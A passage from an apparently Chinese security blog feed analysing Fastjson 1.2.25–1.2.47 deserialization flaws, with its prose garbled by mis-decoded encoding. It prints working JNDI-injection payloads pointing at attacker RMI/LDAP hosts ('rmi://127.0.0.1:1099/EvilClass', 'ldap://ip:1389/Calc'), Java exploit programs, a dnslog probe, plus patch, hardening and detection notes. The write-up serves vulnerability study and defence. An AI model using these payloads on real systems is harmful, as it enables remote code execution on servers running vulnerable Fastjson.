<p>åŸºäºé»‘åå•ç»•è¿‡ï¼ŒautoTypeSupportå±æ€§trueæ‰èƒ½ä½¿ç”¨ï¼Œåœ¨1.2.25ç‰ˆæœ¬ä¹‹åï¼ŒautoTypeSupporté»˜è®¤ä¸ºfalseã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="ååºåˆ—åŒ–æ¼æ´ï¼ˆäºŒï¼‰â€”â€”1-2-25-1-2-47"><a href="#ååºåˆ—åŒ–æ¼æ´ï¼ˆäºŒï¼‰â€”â€”1-2-25-1-2-47" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´ï¼ˆäºŒï¼‰â€”â€”1.2.25-1.2.47"></a>ååºåˆ—åŒ–æ¼æ´ï¼ˆäºŒï¼‰â€”â€”1.2.25-1.2.47</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Fastjson 1.2.25-1.2.47ç‰ˆæœ¬</p>
<p>åˆ©ç”¨é“¾åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;=6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;=6u211ã€7u201ã€8u191</p>
<p>æ­¤æ¼æ´ä¹Ÿå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ç§ç»•è¿‡æ€è·¯ï¼Œç»•è¿‡çš„å¤§ä½“æ€è·¯æ˜¯é€šè¿‡<code>java.lang.Class</code>ï¼Œå°†<code>com.sun.rowset.JdbcRowSetImpl</code>ç±»åŠ è½½åˆ°Mapç¼“å­˜ä¸­ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚ç„¶åå†é€šè¿‡<code>com.sun.rowset.JdbcRowSetImpl</code>æ‰§è¡Œæ¶æ„RMIé“¾æ¥ã€‚payloadå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°å®é™…ä¸Šè¿˜æ˜¯åˆ©ç”¨äº†<code>com.sun.rowset.JdbcRowSetImpl</code>è¿™æ¡åˆ©ç”¨é“¾æ¥æ”»å‡»åˆ©ç”¨çš„ï¼Œå› æ­¤é™¤äº†JDKç‰ˆæœ¬å¤–å‡ ä¹æ²¡æœ‰å…¶å®ƒé™åˆ¶ã€‚</p>
<p>æ³¨æ„ï¼Œè¿™ä¸ªpayloadæ ¹æ®AutoTypeSupportæ¨¡å¼çš„ä¸åŒï¼Œèƒ½å½±å“çš„ç‰ˆæœ¬ä¹Ÿä¸åŒï¼š</p>
<p>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›</p>
<p>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupptï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</p>
<p><strong>æ³¨æ„ï¼Œä¸‹é¢éƒ½æ˜¯åœ¨1.2.41ç‰ˆæœ¬åšçš„è°ƒè¯•</strong></p>
<h3 id="ä¸å¼€å¯AutoTypeSupport"><a href="#ä¸å¼€å¯AutoTypeSupport" class="headerlink" title="ä¸å¼€å¯AutoTypeSupport"></a>ä¸å¼€å¯AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è°ƒè¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥<code>checkAutoType()</code>å‡½æ•°ï¼Œç”±äºautoTypeSupportä¸ºfalseï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªç™½åå•ï¼Œç»§ç»­å¾€ä¸‹è°ƒè¯•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140116727.png"></p>
<p>ç”±äºæ­¤æ—¶typeNameä¸º<code>java.lang.Class</code>ï¼Œä¼šåœ¨<code>this.deserializers.findClass(typeName)</code>å‡½æ•°ä¸­ç›´æ¥è¢«æ‰¾åˆ°ï¼Œä¹‹å<code>clazz</code>ä¸ä¸ºç©ºï¼Œæ‰€ä»¥ä¸ä¼šç»è¿‡ç¬¬äºŒä¸ªé»‘åå•å°±ä¼šè¢«è¿”å›ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140830984.png"></p>
<p>è¿”å›åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>å‡½æ•°ï¼Œè·Ÿè¿›<code>deserialze()</code>å‡½æ•°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140958963.png"></p>
<p>è¿›å»åä¼šå¯¹valè¿›è¡Œåˆ¤ç©ºï¼Œç„¶åç»§ç»­æ‰§è¡Œè§£æå‡º<code>com.sun.rowset.JdbcRowSetImpl</code>å¹¶èµ‹å€¼ç»™<code>objVal</code>ï¼Œå¾€ä¸‹æ‰§è¡Œ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141219432.png" style="zoom:80%;">

<p>ç„¶åèµ‹å€¼ç»™<code>strVal</code>å˜é‡ï¼Œå¾€ä¸‹æ‰§è¡Œ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141511436.png" style="zoom:80%;">

<p>æ¥ç€åˆ¤æ–­clazzæ˜¯å¦ä¸ºclassç±»ï¼Œæ˜¯çš„è¯è°ƒç”¨<code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>åŠ è½½strValæŒ‡å®šçš„ç±»ï¼Œè·Ÿè¿›<code>loadClass()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141810948.png"></p>
<p>åœ¨<code>loadClass()</code>é‡Œé¢ï¼ŒæˆåŠŸåŠ è½½<code>com.sun.rowset.JdbcRowSetImpl</code>åï¼Œä¼šæ”¾è¿›mapä¸­ä½œä¸ºç¼“å­˜</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141939523.png"></p>
<p>åœ¨éå†ç¬¬äºŒéƒ¨åˆ†jsonæ•°æ®æ—¶ï¼Œä¾ç„¶ä¼šè¿›å…¥<code>checkAutoType()</code>å‡½æ•°ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡<code>TypeUtils.getClassFromMapping(typeName)</code>å‡½æ•°è·å–åˆ°åˆšæ‰åœ¨mapä¸­ç¼“å­˜çš„<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œäºæ˜¯clazzå°±æœ‰äº†å€¼ï¼Œå¯ä»¥ç›´æ¥ç»•è¿‡ç¬¬äºŒæ¬¡é»‘ç™½åå•åˆ¤æ–­ï¼Œç›´æ¥è¿”å›ï¼Œä»è€ŒæˆåŠŸç»•è¿‡<code>checkAutoType()</code>çš„æ£€æµ‹é€ æˆJNDIæ³¨å…¥ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201142313798.png"></p>
<h3 id="å¼€å¯AutoTypeSupport"><a href="#å¼€å¯AutoTypeSupport" class="headerlink" title="å¼€å¯AutoTypeSupport"></a>å¼€å¯AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ»¡è¶³ç‰ˆæœ¬çš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½æ‰§è¡ŒæˆåŠŸï¼Œæ¥çœ‹ä¸€ä¸‹å…³é”®çš„ç»•è¿‡ä»£ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201145825818.png"></p>
<p>åœ¨åˆ¤æ–­<code>java.lang.Class</code>çš„æ—¶å€™ï¼Œè·Ÿå‰é¢æ­¥éª¤ä¸€æ ·ï¼Œä¼šå°†<code>com.sun.rowset.JdbcRowSetImpl</code>åŠ å…¥ç¼“å­˜ï¼›å…³é”®åœ¨äºéå†ç¬¬äºŒä¸ªjsonï¼Œå³<code>com.sun.rowset.JdbcRowSetImpl</code>æ—¶ï¼Œæ˜¯æ€ä¹ˆç»•è¿‡é»‘åå•çš„ï¼Ÿ<br>çœ‹ä¸‹é¢å…³é”®åˆ¤æ–­è¯­å¥ï¼Œå‘ç°ç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯ä¸ºtrueçš„ï¼Œå› ä¸º<code>com.sun.rowset.JdbcRowSetImpl</code>åœ¨é»‘åå•ä¸­ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªåˆ¤æ–­æ¡ä»¶ä¸ºfalseï¼Œå› ä¸º<code>com.sun.rowset.JdbcRowSetImpl</code>åœ¨mapç¼“å­˜ä¸­æ˜¯æ‰¾å¾—åˆ°çš„ï¼Œä»è€Œå¯¼è‡´è¿™ä¸ªé»‘åå•åˆ¤æ–­è¯­å¥å¤±æ•ˆã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>ä¸ºä»€ä¹ˆ1.2.25-1.2.32ç‰ˆæœ¬å¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼Ÿ</strong></p>
<p>å¯¹æ¯”å‘ç°æ­£æ˜¯å› ä¸ºè¿™ä¸ªåˆ¤æ–­ä½ç½®ä¸ä¸€æ ·ï¼Œå°‘äº†ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œå³<code>TypeUtils.getClassFromMapping(typeName) == null</code></p>
<h3 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h3><p>é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œ<code>1.2.48</code>ä¸­çš„ä¿®å¤æªæ–½æ˜¯ï¼Œåœ¨loadClass()æ—¶ï¼Œå°†ç¼“å­˜å¼€å…³é»˜è®¤ç½®ä¸ºFalseï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¸èƒ½é€šè¿‡ClassåŠ è½½è¿›ç¼“å­˜äº†ã€‚åŒæ—¶å°†Classç±»åŠ å…¥åˆ°äº†é»‘åå•ä¸­ã€‚</p>
<h4 id="safeModeåŠ å›º"><a href="#safeModeåŠ å›º" class="headerlink" title="safeModeåŠ å›º"></a>safeModeåŠ å›º</h4><p>Fastjsonåœ¨1.2.68åŠä¹‹åçš„ç‰ˆæœ¬ä¸­å¼•å…¥äº†safeModeï¼Œé…ç½®safeModeåï¼Œæ— è®ºç™½åå•å’Œé»‘åå•ï¼Œéƒ½ä¸æ”¯æŒautoTypeï¼Œå¯æœç»ååºåˆ—åŒ–Gadgetsç±»å˜ç§æ”»å‡»ã€‚å¼€å¯safeModeæ˜¯å®Œå…¨å…³é—­autoTypeåŠŸèƒ½ï¼Œå¯èƒ½ä¼šæœ‰å…¼å®¹é—®é¢˜ã€‚</p>
<p>å…·ä½“å‚è€ƒï¼š<a href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">https://github.com/alibaba/fastjson/wiki/security_update_20220523</a></p>
<p>ç›®å‰2022å¹´5æœˆ23æ—¥å‘å¸ƒçš„Fastjson 1.2.83æ˜¯1.xç³»åˆ—çš„æœ€åä¸€ä¸ªç‰ˆæœ¬</p>
<p>ä»2022å¹´4æœˆ17æ—¥å¼€å§‹ï¼ŒFastjsonä¹Ÿè¿›å…¥äº†2.0æ—¶ä»£ã€‚</p>
<h2 id="é«˜ç‰ˆæœ¬JDKç»•è¿‡æ€è·¯"><a href="#é«˜ç‰ˆæœ¬JDKç»•è¿‡æ€è·¯" class="headerlink" title="é«˜ç‰ˆæœ¬JDKç»•è¿‡æ€è·¯"></a>é«˜ç‰ˆæœ¬JDKç»•è¿‡æ€è·¯</h2><p>ç”±ä¹‹å‰åˆ©ç”¨çš„PoCçŸ¥é“ï¼Œåˆ©ç”¨èŒƒå›´æœ€å¹¿çš„PoCæ˜¯åŸºäº<code>com.sun.rowset.JdbcRowSetImpl</code>çš„åˆ©ç”¨é“¾çš„ï¼Œè€Œè¿™ç§åˆ©ç”¨æ–¹å¼æ˜¯åŸºäºJNDIæ³¨å…¥æ¼æ´çš„ï¼Œæ˜¯éœ€è¦æˆ‘ä»¬æœ‰RMIæœåŠ¡æˆ–LDAPæœåŠ¡ã€‚</p>
<p>è¿™æ ·å°±ä¼šå¯¼è‡´ä¸€ä¸ªé™åˆ¶çš„é—®é¢˜ï¼Œå³JNDIæ³¨å…¥æ¼æ´åˆ©ç”¨çš„é™åˆ¶é—®é¢˜â€”â€”JDKç‰ˆæœ¬ã€‚</p>
<p>ç”±ä¹‹å‰çš„åˆ†æçŸ¥é“ï¼ŒJDKå¯¹äºJNDIæ³¨å…¥æ¼æ´åœ¨ä¸åŒç‰ˆæœ¬æœ‰ç€ä¸åŒçš„é˜²å¾¡æªæ–½ï¼š</p>
<ul>
<li>JDK 6u45ã€7u21ä¹‹åï¼š<code>java.rmi.server.useCodebaseOnly</code>çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºtrueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„<code>java.rmi.server.codebase</code>æŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯VMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</li>
<li>JDK 6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†<code>com.sun.jndi.rmi.object.trustURLCodebase</code>é€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</li>
<li>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†<code>com.sun.jndi.ldap.object.trustURLCodebase</code>é€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼Œæˆ‘ä»¬åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´çš„åŸºäº<code>com.sun.rowset.JdbcRowSetImpl</code>çš„åˆ©ç”¨é“¾ä¸Šï¼Œæ›´å€¾å‘äºä½¿ç”¨LDAPæœåŠ¡æ¥å®ç°æ”»å‡»åˆ©ç”¨ï¼Œå› ä¸ºå…¶å¯¹äºJDKçš„é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚</p>
<p>ä½†æ˜¯å¦‚æœç›®æ ‡ç¯å¢ƒçš„JDKç‰ˆæœ¬åœ¨6u211ã€7u201ã€8u191ä¹‹åï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±æ²¡æœ‰åŠæ³•ç»•è¿‡äº†å‘¢ï¼Ÿ</p>
<p>å½“ç„¶æ˜¯æœ‰çš„ï¼Œå‚è€ƒï¼š<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">å¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥åˆ©ç”¨</a></p>
<p>ä¸»è¦æ˜¯æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory</li>
<li>åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget</li>
</ul>
<p>å…·ä½“å¯å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« ï¼š<a href="http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">æµ…æé«˜ä½ç‰ˆJDKä¸‹çš„JNDIæ³¨å…¥åŠç»•è¿‡</a></p>
<h2 id="æ£€æµ‹æ€è·¯"><a href="#æ£€æµ‹æ€è·¯" class="headerlink" title="æ£€æµ‹æ€è·¯"></a>æ£€æµ‹æ€è·¯</h2><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><p>å…¨å±€æœç´¢æ˜¯å¦ä½¿ç”¨åˆ°äº†Fastjsonï¼Œè‹¥ä½¿ç”¨äº†åˆ™è¿›ä¸€æ­¥æ’æŸ¥æ˜¯å¦ä¸ºæ¼æ´ç‰ˆæœ¬å·å³1.2.22-1.2.47ï¼Œè‹¥æ˜¯åˆ™å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„é£é™©ï¼Œéœ€è¿›ä¸€æ­¥æ’æŸ¥ã€‚</p>
<p>å…¨å±€æœç´¢å¦‚ä¸‹å…³é”®ä»£ç ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥æ’æŸ¥å‚æ•°æ˜¯å¦å¤–éƒ¨å¯æ§ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>
JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h3><p>1.HTTPè¯·æ±‚åŒ…å¦‚æœæ˜¯JSONæ ¼å¼çš„æ•°æ®ï¼Œå°±æœ‰å¯èƒ½æ˜¯Fastjsonã€‚</p>
<p>2.æŠ“åˆ°åŒ…ä»¥åï¼Œå°†è¯·æ±‚æ–¹æ³•æ”¹ä¸ºPOSTï¼›è¯·æ±‚å¤´éƒ¨<code>Content-Type</code>å­—æ®µä¿®æ”¹ä¸º<code>Content-Type: application/json</code>ï¼›å¦‚ä¸‹åˆ é™¤jsonæ ¼å¼åŒ…çš„ä¸€åŠï¼Œè§‚å¯ŸæŠ¥é”™æ˜¯å¦æœ‰fastjsonä¹‹ç±»çš„ç‰¹å¾ã€‚</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
<span class="token property">"name"</span><span class="token operator">:</span>"<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>3.<code>java.net.InetAddress</code>è¿™ä¸ªç±»åœ¨å®ä¾‹åŒ–æ—¶ä¼šå°è¯•ä½œå¯¹example.comåšåŸŸåè§£æï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡dnslogçš„æ–¹å¼å¾—çŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.InetAddress"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"i1q73g.dnslog.cn"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Fastjsonç³»åˆ—ï¼š<a href="http://www.mi1k7ea.com/archives/2019/">http://www.mi1k7ea.com/archives/2019/</a></p>
<p>Fastjsonååºåˆ—åŒ–æ¼æ´çš„è°ƒè¯•ä¸åˆ†æï¼š<a href="https://blog.csdn.net/qq_34101364/article/details/111706189">https://blog.csdn.net/qq_34101364/article/details/111706189</a></p>
<p>Fastjsonç³»åˆ—-æ¼æ´å¤ç°ï¼š<a href="https://www.freebuf.com/vuls/358459.html">https://www.freebuf.com/vuls/358459.html</a></p>
<p>Fastjsonä¸å‡ºç½‘åˆ©ç”¨æ€»ç»“ï¼š<a href="https://xz.aliyun.com/t/12492">https://xz.aliyun.com/t/12492</a></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>ç»†è¯»ç»å…¸</category>
      </categories>
      <tags>
        <tag>JNDIæ³¨å…¥</tag>
        <tag>Fastjson</tag>
      </tags>
  </entry>
</search>
